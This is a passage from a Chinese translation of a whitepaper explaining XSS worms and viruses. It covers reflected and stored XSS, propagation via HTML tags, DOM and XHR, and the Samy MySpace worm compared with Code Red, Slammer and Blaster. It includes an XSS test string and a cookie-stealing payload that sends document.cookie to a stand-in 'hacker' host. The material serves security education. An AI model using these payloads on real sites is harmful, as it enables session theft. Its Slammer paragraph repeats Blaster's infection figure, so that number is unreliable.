&lt;p&gt;3、 甚至比更臭名昭著的蠕虫病毒,如 Code Red, Slammer 和 Blaster 传播的更快更干净。&lt;/p&gt;
&lt;p&gt;4、 可以创建一个 Web 浏览器僵尸网络实现大规模的 DDoS 攻击。存在破坏数据、发送垃圾邮件、欺骗客户的潜力。&lt;/p&gt;
&lt;p&gt;5、 与操作系统（Windows，Linux 和 Macintosh OS X 等等）无关，因为是在 Web 浏览器发生并执行的。&lt;/p&gt;
&lt;p&gt;6、 能够避免网络堵塞,因为通过 Web 服务器到 Web 浏览器（客户端 - 服务器）模式传播，而不是一个典型的盲目的 对等模型。&lt;/p&gt;
&lt;p&gt;7、 不依赖于 web 浏览器或者操作系统漏洞。&lt;/p&gt;
&lt;p&gt;8、 可以利用第三方提供的网页部件（广告横幅，天气和投票模块，JavaScript 的 RSS 订阅，流量计数器等）传播。&lt;/p&gt;
&lt;p&gt;9、 找出恶意代码将是一个挑战，因为受感染的浏览器的网络行为保持相对不变，很难区分正常的 Web 页面标签中的&lt;/p&gt;
&lt;p&gt;JavaScript 攻击代码。&lt;/p&gt;
&lt;p&gt;10、 比传统互联网病毒更容易停下来，因为拒绝感染网站的访问可以被隔离以阻止传播。&lt;/p&gt;
&lt;h1 id=&quot;XSS-的概述&quot;&gt;&lt;a href=&quot;#XSS-的概述&quot; class=&quot;headerlink&quot; title=&quot;XSS 的概述&quot;&gt;&lt;/a&gt;XSS 的概述&lt;/h1&gt;&lt;p&gt;最重要的要了解 XSS 漏洞的是，他们是目前为止发现的，在所有网站超过 80％比例的定制 Web 应用程序中最常 见的漏洞。虽然跨站点脚本在一段时间内一直被认为是中等程度的的漏洞，但 XSS 蠕虫和病毒的出现，已经提高了 XSS 的评估。软件开发人员和安全专业人员需要知道它是多么简单，以防止代码开发过程中出现 XSS 漏洞，并且一经查出， 他们是多么容易解决。XSS 是一种攻击技术，它使得一个网站，写出攻击者提供的可执行代码，然后加载在用户的 Web 浏览器。也就是说，当黑客使用存在漏洞的网站作为攻击的通道时，用户是预定的受害者。&lt;/p&gt;
&lt;h1 id=&quot;非持久型-XSS&quot;&gt;&lt;a href=&quot;#非持久型-XSS&quot; class=&quot;headerlink&quot; title=&quot;非持久型 XSS&quot;&gt;&lt;/a&gt;非持久型 XSS&lt;/h1&gt;&lt;p&gt;(译者注：也叫反射型 XSS)&lt;/p&gt;
&lt;p&gt;想想看，一个黑客想使用“(&lt;a href=&quot;http://victim/)/”网站对用户进行&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://victim/)/”网站对用户进行&lt;/a&gt; XSS 攻击。黑客会采取的第一个步骤是在 &lt;a href=&quot;http://victim/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://victim/&lt;/a&gt; 找出一个 XSS 漏洞，然后构造一个特制的 URL，也被称为链接。要做到这一点，黑客会搜寻网站上的客户端提供的数 据可以被发送到 Web 服务器，然后回显到屏幕上的任何功能，比如搜索框。&lt;/p&gt;
&lt;p&gt;图一展现的是一种常见的在线发布的博客。XSS 漏洞往往出现在搜索框表单。在搜索字段中输入“test search”， 响应页面将用户输入的文本在显示在三个不同的位置，如图 2 所示。图下方是新的 URL。查询字符串中包含值为 “test+search”的“search”参数。这个 URL 值可以在运行时更改，甚至包括 HTML / JavaScript 的内容。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../img/xss-蠕虫-病毒-即将发生的威胁与最好的防御/Image_002.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;图 1 &lt;a href=&quot;http://victim/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://victim/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;图 2 &lt;a href=&quot;http://victim/search.pl?search=test%2Bsearch&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://victim/search.pl?search=test+search&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;图 3 展示了原来的搜索词被替换为下面的 HTML / JavaScript 代码时会发生什么：&lt;/p&gt;
&lt;p&gt;Example 1.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;”&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(‘XSS%20Testing’)&amp;lt;/SCRIPT&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果页面弹出了一个无害的警告对话框。根据提示，提交的代码已经成为 web 页面的一部分，证明了 JavaScript 已进入到&lt;a href=&quot;http://victim/%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E5%B9%B6%E5%BE%97%E5%88%B0%E6%89%A7%E8%A1%8C&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://victim/&lt;/a&gt;的上下文并得到执行。图 4 展示了夹杂有新的 HTML/ JavaScript 代码的 Web 页面的 HTML 源代 码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../img/xss-蠕虫-病毒-即将发生的威胁与最好的防御/Image_003.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;图 3，原来的搜索词将被替换为 HTML/ JavaScript 代码。&lt;/p&gt;
&lt;p&gt;图 4，夹杂有新的 HTML/ JavaScript 代码的 Web 页面的 HTML 源代码。&lt;/p&gt;
&lt;p&gt;此时，黑客将会继续修改这个 URL，包含更复杂的 XSS 攻击来利用用户。一个典型的例子是一个简单的 cookie 盗 窃的攻击。&lt;/p&gt;
&lt;p&gt;Example 2.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;“&amp;gt;&amp;lt;SCRIPT&amp;gt;var+img=new+Image();img.src=”http://hacker/”%20+%20document.cookie;&amp;lt;/SCRIPT&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前面的 JavaScript 代码创建一个图像 DOM（文档对象模型）对象。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var img=new Image();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为 JavaScript 代码在“&lt;a href=&quot;http://victim/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://victim/&lt;/a&gt;”上下文中执行，所以它可以访问 cookie 数据。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;document.cookie;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;图形对象然后指派一个外域的 URL 发送带有 Web 浏览器的 Cookie 字符串的数据到“&lt;a href=&quot;http://hacker/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://hacker/&lt;/a&gt;”。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;img.src=”http://hacker/” + document.cookie;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是一个例子，是一个被发送的 HTTP 请求。&lt;/p&gt;
&lt;p&gt;Example 3.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;GET http://hacker/path/_web_browser_cookie_data HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Host: host&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;User-Agent: Firefox/1.5.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一旦黑客完成了他的攻击代码，他会通过垃圾邮件，留言板的帖子，即时消息和其他方法宣传这种特制的链接， 试图吸引用户点击。是什么让这种攻击这么有效？用户可能点击正常的网络钓鱼邮件 7 中的链接是因为这个 URL 包 含了真正的网站域名，而不是一种外观相似的域名或随机的 IP 地址。应当注意的是，过长的 XSS 链接可以使用 URL 缩短服务，如 TinyURL.com 进行伪装。&lt;/p&gt;
&lt;h1 id=&quot;持久型-XSS&quot;&gt;&lt;a href=&quot;#持久型-XSS&quot; class=&quot;headerlink&quot; title=&quot;持久型 XSS&quot;&gt;&lt;/a&gt;持久型 XSS&lt;/h1&gt;&lt;p&gt;(译者注：也叫存储型 XSS)&lt;/p&gt;
&lt;p&gt;持久型（或 HTML 注入型）XSS 攻击最常发生在由社区内容驱动的网站或 Web 邮件网站，不需要特制的链接来 执行。黑客仅仅需要提交 XSS 漏洞利用代码到一个网站上其他用户可能访问的地方。这些地区可能是博客评论，用户 评论，留言板，聊天室，HTML 电子邮件，wikis，和其他的许多地方。一旦用户访问受感染的网页，执行是自动的。 这使得持续性的 XSS 的危险性比非持久性高，因为用户没有办法保护自己。一旦黑客成功在某个页面注入了漏洞利&lt;/p&gt;
&lt;p&gt;用代码，他将宣传受感染页面的 URL 来希望不知情的用户中招。即使用户对非持续性 XSS 的 URL 懂得识别，也会很 容易的受到影响(译者:中招)。&lt;/p&gt;
&lt;p&gt;无论使用非持续性或持续性的 XSS 漏洞，黑客可以利用用户，导致网络和财务上的损失，有许多的方法。 从这点出发，我们将专注于的 XSS 病毒和蠕虫的攻击技术。欲了解更多 XSS 信息，请访问“跨站脚本常见问题解答 8”和“XSS 小抄 9” ，两个优秀的信息资源。&lt;/p&gt;
&lt;h1 id=&quot;他们是怎么做的-传播的方法&quot;&gt;&lt;a href=&quot;#他们是怎么做的-传播的方法&quot; class=&quot;headerlink&quot; title=&quot;他们是怎么做的:传播的方法&quot;&gt;&lt;/a&gt;他们是怎么做的:传播的方法&lt;/h1&gt;&lt;p&gt;对于一个病毒或蠕虫想要成功，它需要一个执行和传播的方法。电子邮件病毒通常在鼠标点击后执行，然后通过 您的联系人列表来发送带有恶意软件的的邮件进行传播。网络蠕虫利用远程利用漏洞危害机器和并且通过连接到其他 存在漏洞的主机进行传播。除传播之外，蠕虫病毒还是高度多样化，包括创造 DDoS 僵尸网络，垃圾邮件僵尸，或远 程键盘监控的能力。XSS 蠕虫与其他形式的恶意软件相似，但以自己独特的方式执行和传播。使用一个网站来存放恶 意代码，XSS 蠕虫和病毒通过控制 Web 浏览器，使得它复制恶意软件到网络上的其他地方去感染别人来进行传播。例 如，一个含有恶意软件的博客评论，可以使用访问者的浏览器发布额外的感染性的博客评论。XSS 蠕虫病毒可能会使 得浏览器进行发送电子邮件，转账，删除/修改数据，入侵其他网站，下载非法内容，以及许多其他形式的恶意活动。 用最简单的方式去理解，就是如果没有适当的防御，在网站上的任何功能都可以在未经用户许可的情况下运行。&lt;/p&gt;
&lt;p&gt;在最后一节中，我们将重点放在 XSS 漏洞本身，以及用户可以怎么样被利用。现在，我们来看 XSS 恶意软件是如 何可以进行远程通信。XSS 漏洞利用代码，通常是 HTML / JavaScript，使用三种方式使得浏览器发送远程 HTTP 请求的 浏览器：嵌入式的 HTML 标签，JavaScript DOM 的对象，XMLHTTPRequest（XHR）。&lt;/p&gt;
&lt;p&gt;另外，请记住，如果你碰巧登录到远程网站，您的浏览器是被迫作出的身份验证的请求的。关于 XSS 恶意软件的 传播方法与传统互联网病毒的明显差异将会进行简要说明。&lt;/p&gt;
&lt;p&gt;嵌入式 HTML 标签&lt;/p&gt;
&lt;p&gt;一些 HTML 标签具有在页面加载时会自动发起 Web 浏览器的 HTTP 请求的属性。有一个例子是 IMG（图像）的 SRC 属性。SRC 属性用于指定在 Web 页面中显示的图像文件的 URL 地址。当你的浏览器载入带有 IMG 标签的网页， 图像会自动被请求，并在浏览器中显示。但是，SRC 属性也可以被用于任何 Web 服务器的其他 URL，不仅仅是包含图 像的。&lt;/p&gt;
&lt;p&gt;例如，如果我们进行了谷歌搜索“WhiteHat Security”我们最终得到了下面的 URL：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://www.google.com/search?hl=en&amp;amp;q=whitehat+security&amp;amp;btnG=Google+Search&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个 URL 可以很容易地取代 IMG 内的 SRC 属性的值，从而迫使您的 Web 浏览器中执行相同的谷歌搜索。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=”http://www.google.com/search?hl=en&amp;amp;q=whitehat+security&amp;amp;btnG=Google+Search”&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;显然使得 Web 浏览器发送一个谷歌搜索请求是没有什么危害性的。然而，URL 构建的同样的过程可以用来使得 Web 浏览器自动进行银行账户资金的汇款，发表煽动性言论，甚至入侵网站。这一点可以说明，这是一个迫使一个 Web 浏览器连接到其他网站，使的 XSS 蠕虫病毒传播的机制。&lt;/p&gt;
&lt;p&gt;额外的源码例子可见“嵌入式 HTML 标签”的附录部分。&lt;/p&gt;
&lt;p&gt;JavaScript 和文档对象模型&lt;/p&gt;
&lt;p&gt;JavaScript 被用于给网站访问者一个丰富的、交互式的体验。这些网页更接近于一个软件应用程序，而不是一个 静态的 HTML 文档。我们常会看到 JavaScript 被用于进行图像的翻转，动态表单输入检查，弹出对话框，下拉菜单， 拖动和拖放等。JavaScript 有接近完全的对网站上的每一个对象，包括图像，cookies，窗口，框架和文本内容的访问。 这些对象中的每一个都是文档对象模型（DOM）的一部分。&lt;/p&gt;
&lt;p&gt;DOM 提供了一系列 JavaScript 读取和操作的应用程序编程接口（API）。类似嵌入式 HTML 标签的功能，JavaScript 可以操纵 DOM 对象自动发起 Web 浏览器的 HTTP 请求。图像和窗口的源 URL 可以被重新指定为其他 URL 的。&lt;/p&gt;
&lt;p&gt;在上一节中，我们可以使用 JavaScript 来改变图像的 DOM 对象 SRC 进行谷歌搜索“WhiteHat Security”。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;img[0].src = http://www.google.com/search?hl=en&amp;amp;q=whitehat+security&amp;amp;btnG=Google+Search;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;正如上一节中，迫使 Web 浏览器连接到其他网站发送一个谷歌搜索请求是一种无害的例子。但这也说明了 XSS 恶意软件传播的另一种方法。&lt;/p&gt;
&lt;p&gt;额外的源码例子可见“JavaScript DOM 对象”的附录部分。&lt;/p&gt;
&lt;p&gt;XmlHttpRequest (XHR)&lt;/p&gt;
&lt;p&gt;2005 年 2 月，Jesse James Garrett 创造一个被称为“异步 JavaScript 和 XML”或“AJAX”的 Web 编程术语 10。AJAX 定义了使网站内容进行更新而无需重新加载的技术的集合。今天，许多流行的网站，包括 Gmail 和谷歌地图使用 AJAX 的丰富的功能。中央的底层技术是一种称为 XMLHttpRequest1（1 XHR）的 JavaScript API，支持 IE 浏览器，Mozilla，Firefox，Safari，Camin，Opera 和许多其他浏览器的。XHR 提供了一个灵活的机制来发送 HTTP 请求。有 XHR 后，使用 HTML 技 巧或操作 DOM 对象是没有必要的。任意请求可以在后台发送。&lt;/p&gt;
&lt;p&gt;源码例子可见“XmlHTTPRequest”的附录部分。&lt;/p&gt;
&lt;h1 id=&quot;第一个-XSS-蠕虫-Samy&quot;&gt;&lt;a href=&quot;#第一个-XSS-蠕虫-Samy&quot; class=&quot;headerlink&quot; title=&quot;第一个 XSS 蠕虫: Samy&quot;&gt;&lt;/a&gt;第一个 XSS 蠕虫: Samy&lt;/h1&gt;&lt;p&gt;2005 年 10 月 4 日，Samy 蠕虫，同类中第一个重大的蠕虫病毒，利用一个在 MySpace.com 的个人资料页面模板 的持续的跨站点脚本漏洞进行传播。Samy，也是作者，用漏洞的 JavaScript 攻击代码的第一个副本更新了他的个人资 料页面（图 5）。MySpace 上进行一些的输入的黑名单过滤，以防止 XSS 攻击，但他们还做的不够好。使用一些绕过技 术，Samy 成功上传了他的代码。当一个通过身份验证 MySpace 的用户观看 Samy 的个人资料，该蠕虫病毒的 payload 使用 XHR，使得用户的网页浏览器发送请求，增加 Samy 为朋友，包括加 Samy 为他英雄（译者注：类似微博关注）（“但最重要的是，加 Samy 为英雄这点”，如图 6），并用恶意代码的副本改变用户的个人资料。当用户访问 Samy 或 者其他受感染用户的个人资料页，他们基本上在打开浏览器时就受到攻击。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../img/xss-蠕虫-病毒-即将发生的威胁与最好的防御/Image_004.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;图 5 和图 6 示是 MySpace 蠕虫的技术解释。&lt;/p&gt;
&lt;p&gt;图 5（左）。Samy，作者，更新了他的个人资料的页面。&lt;/p&gt;
&lt;p&gt;图 6（右）。&lt;/p&gt;
&lt;p&gt;当通过身份验证的 MySpace 用户浏览 Samy 的个人资料，蠕虫 payload 使用 XHR，使得用户的 Web 浏览器添加 Samy 朋友，包括添加 Samy 为英雄从单一访客，然后随着在社交网络上的每一个新的不知情的朋友，Samy 蠕虫感染呈几何级数增长，受感染的用 户资料页面超过 1,000,000。MySpace 是被迫关闭其网站，以阻止感染，修复漏洞，并进行清理。重要的是要注意， MySpace 的用户不需要是脆弱的东西。对于任何类似的蠕虫病毒所需要的是一个对于大多数网站已经存在的流行网 站的漏洞。为了获得 Samy 蠕虫的意义的新的认识，我们会比较其它相关的暴发，并看到它如何壮大起来的。&lt;/p&gt;
&lt;h1 id=&quot;第一个-24-小时的传播：Samy-创下的纪录&quot;&gt;&lt;a href=&quot;#第一个-24-小时的传播：Samy-创下的纪录&quot; class=&quot;headerlink&quot; title=&quot;第一个 24 小时的传播：Samy 创下的纪录&quot;&gt;&lt;/a&gt;第一个 24 小时的传播：Samy 创下的纪录&lt;/h1&gt;&lt;p&gt;病毒或蠕虫爆发的第一个 24 小时内，传播速度最快，并导致造成最大的伤害。病毒和蠕虫传播使用各种不同的 技术，各有自己的长处和局限性。全球网络的反应的首要任务是先确定新的疫情，隔离源头，捕捉违规的恶意软件， 确定感染方法和传播模式，然后制定防御措施。让我们回顾一些近几年的大爆发，然后看看 Samy 蠕虫是如何使他们 黯然失色的。&lt;/p&gt;
&lt;h3 id=&quot;Code-Red-I-和-Code-Red-II-红色代码&quot;&gt;&lt;a href=&quot;#Code-Red-I-和-Code-Red-II-红色代码&quot; class=&quot;headerlink&quot; title=&quot;Code Red I 和 Code Red II(红色代码)&quot;&gt;&lt;/a&gt;Code Red I 和 Code Red II(红色代码)&lt;/h3&gt;&lt;p&gt;2001 年 7 月 12 日 - “红色代码”利用了微软的 IIS Web 服务的缓冲区溢出漏洞。红色代码（Code Red）在 24 小 时通过随机扫描其他受害者感染了超过 359,000 的电脑 15。几个星期后（2001 年 8 月 4 日），红色代码 II，不同的但 更先进的蠕虫，利用相同的漏洞来感染 275,000 台电脑 16。从许多变种的红色代码（Code Red）的 payload 分析，包含有网站涂改，种植后门，拒绝服务攻击白宫网站。相关的预计恢复成本接近 26 亿美元。&lt;/p&gt;
&lt;h3 id=&quot;Slammer-地狱&quot;&gt;&lt;a href=&quot;#Slammer-地狱&quot; class=&quot;headerlink&quot; title=&quot;Slammer(地狱)&quot;&gt;&lt;/a&gt;Slammer(地狱)&lt;/h3&gt;&lt;p&gt;2003 年 1 月 25 日 - Slammer17，只有 376 字节大小，利用未打补丁的版本的 Microsoft SQL Server 中的一个缓冲 区溢出漏洞传播它自己在 UDP 端口 1434 上。受感染的主机会随机扫描 IP 地址，并迅速蔓延到其他易受攻击的主机 18。令人印象深刻的是，大多数 Slammer 的受害者（55,000 至 75,000）在爆发的第一个十分钟内被感染 19。非常快 的增长速度，造成了全球性的网络中断，影响了数百万台计算机，造成大约 10 亿美元的损失。但是，闪电的增长速度所致的中断阻碍了整体感染。在 24 小时之内，冲击波在全球各地已经感染了 336,000 台计算机。&lt;/p&gt;
&lt;h3 id=&quot;Blaster-冲击波&quot;&gt;&lt;a href=&quot;#Blaster-冲击波&quot; class=&quot;headerlink&quot; title=&quot;Blaster(冲击波)&quot;&gt;&lt;/a&gt;Blaster(冲击波)&lt;/h3&gt;&lt;p&gt;2003 年 8 月 11 号 - “冲击波”蠕虫通过远程过程调用（RPC）攻击未打补丁的版本的 Microsoft Windows 的计算 机而到来。一旦计算机被感染，该蠕虫会打开一个 TFTP（简单文件传输协议）命令其他受感染的机器下载 payload。 在 24 小时之内，冲击波在全球各地已经感染了 336,000 的计算机 20。一旦安装就位，冲击波修改系统启动项，在启 动的时候运行自己并开始扫描互联网其他易受感染的机器。&lt;/p&gt;
&lt;h1 id=&quot;对比分析&quot;&gt;&lt;a href=&quot;#对比分析&quot; class=&quot;headerlink&quot; title=&quot;对比分析&quot;&gt;&lt;/a&gt;对比分析&lt;/h1&gt;&lt;p&gt;通过比较每个蠕虫在第一个 24 小时内的传播总数（图 7 所示），Samy 蠕虫轻而易举地超过了往年的那些蠕虫。 同样重要的是要明白，大多数的蠕虫在操作系统或应用程序级别感染的整个电脑。XSS 蠕虫和病毒，在另一方面，只 感染网络浏览器。但是，跨站脚本恶意软件拥有利用特定的网页浏览器的漏洞直接获得操作系统和应用层上的利用代 码的权力。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../img/xss-蠕虫-病毒-即将发生的威胁与最好的防御/Image_005.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;图 7，蠕虫的第一个 24 小时的传播量&lt;/p&gt;
&lt;p&gt;上图引出了一个非常中肯的问题：为什么 Samy 能够成长的比以前的蠕虫病毒如此的快，而不会造成灾难性的网络拥塞吗？答案可能是 XSS 病毒传播方式不同，并没有引起广泛的网络饱和度，阻碍感染率。 如红色代码，Blaster 和 Slammer 等蠕虫使用快速的方法传播。每个受感染的主机爆炸的互联网 IP 地址范围是困难和尽可能快的，（图 8）。随着受感染机器的数量的增加，所以无用的网络噪声的数量也随着增加。经过一段时 间，感染的网络开始失去其效力，因为目标机器不存在，或仅仅是不容易受到攻击。然后，在某些时候，网络变得 负担过重，最终在流量洪水中崩溃。那么， XSS 蠕虫与这有何不同？&lt;/p&gt;
&lt;p&gt;XSS 蠕虫和病毒有一个分布的中心点，Web 服务器，并且执行只发生在 Web 浏览器。接下来，攻击代码只从 Web 服务器发送到浏览器，反之亦然（见图 9），而不是从浏览器到浏览器或其他蠕虫的对等情况。这个特性减少了 网络噪声的体积。此外，每个网站访问代表一个活的计算机和可能的受害者，因为 XSS 恶意软件是不依赖于操作系 统。因此，感染的成功率要大得多。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../img/xss-蠕虫-病毒-即将发生的威胁与最好的防御/Image_006.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;图 8，对等网络的蠕虫传播&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../img/xss-蠕虫-病毒-即将发生的威胁与最好的防御/Image_007.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;图 9，Web 服务器到 Web 浏览器的蠕虫传播 在本白皮书中开头，我们问：“拥有和控制着超过一百万可支配的 Web 浏览器和千兆带宽，可以做什么？”大规模的分布式拒绝服务攻击（DDoS）是一个简单的答案。让我们保守地说，每个浏览器有一个 128 Kb / s 的平均速 度（千比特/秒），并能产生一个 HTTP 请求，每秒的组合拨号，DSL，电缆，和 T-1 连接。其结果将是 128,000,000 Kb/ s 或 122 Gb / s 的吞吐量和每秒 1,000,000 HTTP 请求- 无疑是一个巨大的资源集合的访问。&lt;/p&gt;
&lt;p&gt;作为对照，在 2000 年初，几个大型网站（雅虎，嘉信理财，Amazon.com，ETRADE，CNN.com）被进行了大规 模的 DDoS 攻击。一些网络运营商声称超过 1 Gb / s 的流量。巨大的损失和宕机时间。安全的说，一个设计良好的跨 站脚本蠕虫可能破坏甚至最强大的网络，因为很少，如果有的话，系统可以承受 100 千兆/秒或更大的负荷。在 Samy 蠕虫后的不久，更多的 XSS 蠕虫被发现—或者表明了一种东西到来的趋势。&lt;/p&gt;
&lt;h1 id=&quot;最坏的情况&quot;&gt;&lt;a href=&quot;#最坏的情况&quot; class=&quot;headerlink&quot; title=&quot;最坏的情况&quot;&gt;&lt;/a&gt;最坏的情况&lt;/h1&gt;&lt;p&gt;随着 XSS 病毒和蠕虫作者增加其复杂程度，它们会开始寻找大多数 Web 浏览器可以直接访问的网站的区域。最 流行的网站，包括社区驱动的内容，将继续成为主要的目标。恶意软件的编写者甚至可能开始结合多个网站的漏洞 以达到最大效用。但是，也有另一种微妙的目标 - 第三方供应商的插件，包括横幅广告，天气和投票模块， JavaScript 的 RSS 提要，流量计数器，等等。&lt;/p&gt;
&lt;p&gt;第三方网站的部件往往包含在使用 JavaScript 的远程调用的 HTML 代码里。下面是一个例子（见例 4。）许多网 站包括谷歌的 AdSense（参见图 10）使用 JavaScript。&lt;/p&gt;
&lt;p&gt;Example 4.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script type=”text/javascript”&amp;gt;&amp;lt;!-- google_ad_width = 728;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;google_ad_height = 90; google_ad_format = “728x90_as”; google_ad_type = “text_image”; google_ad_channel =””; google_color_border = “CCCCCC”; google_color_bg = “FFFFFF”; google_color_link = “000000”;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;google_color_url = 